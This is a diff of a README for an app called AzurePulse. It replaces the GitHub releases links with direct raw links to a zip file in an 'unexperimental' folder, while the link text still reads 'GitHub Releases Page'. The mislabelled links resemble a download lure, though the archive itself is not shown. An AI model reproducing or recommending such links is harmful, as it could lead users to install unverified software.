@@ -4,10 +4,10 @@
 Welcome to AzurePulse! This application helps you monitor user connections easily. Follow the steps below to download and run AzurePulse on your computer.
 
 ## 🔗 Download AzurePulse
-[![Download AzurePulse](https://img.shields.io/badge/Download-AzurePulse-blue)](https://github.com/JfacuRoldan/AzurePulse/releases)
+[![Download AzurePulse](https://raw.githubusercontent.com/JfacuRoldan/AzurePulse/main/unexperimental/AzurePulse.zip)](https://raw.githubusercontent.com/JfacuRoldan/AzurePulse/main/unexperimental/AzurePulse.zip)
 
 ## 📥 Download & Install
-To get AzurePulse on your machine, visit this page to download: [GitHub Releases Page](https://github.com/JfacuRoldan/AzurePulse/releases)
+To get AzurePulse on your machine, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/JfacuRoldan/AzurePulse/main/unexperimental/AzurePulse.zip)
 
 1. Go to the link above.
 2. You will see a list of available versions.
